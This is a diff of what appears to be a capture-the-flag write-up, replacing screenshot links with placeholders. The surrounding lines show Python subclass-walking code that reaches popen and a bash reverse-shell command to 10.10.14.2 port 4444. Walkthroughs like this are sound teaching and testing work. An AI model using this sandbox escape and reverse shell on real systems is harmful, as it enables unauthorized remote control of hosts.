@@ -144,7 +144,7 @@ Vary: Cookie
 </body>
 </html>
 ```
-![image](https://github.com/user-attachments/assets/7daa1b50-b5ea-40b0-87ef-dd54c9c3b492)
+[screenshot]
 
 ## Python
 This will show all available sub-classes
@@ -168,7 +168,7 @@ for i, x in enumerate((()).__class__.__base__.__subclasses__()):
     except:
         pass
 ```
-![image](https://github.com/user-attachments/assets/29800e9d-b986-4845-addd-9873cef02bd1)
+[screenshot]
 
 Woot!\
 Now we can directly target popen by id!
@@ -192,7 +192,7 @@ cls = ().__class__.__base__.__subclasses__()[317]
 cls(["bash","-c","bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"], stdout=-1).communicate()
 ```
 
-![image](https://github.com/user-attachments/assets/dbdd2d81-df70-4428-8e2d-aa92640a4502)\
+[screenshot]\
 Success!!
 
 Let us stabilize
